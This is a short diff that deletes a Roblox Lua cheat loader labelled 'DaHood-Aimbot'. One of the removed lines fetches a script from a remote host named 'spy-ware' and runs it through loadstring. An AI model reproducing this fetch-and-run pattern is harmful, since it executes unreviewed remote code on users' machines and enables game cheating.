@@ -1,3 +1,0 @@
---//DaHood-Aimbot
-_G.SploitGodZ_Aimbot = true;
-loadstring(game:HttpGet(('https://spy-ware.000webhostapp.com/dahoodscripts/aimbot.lua'),true))()
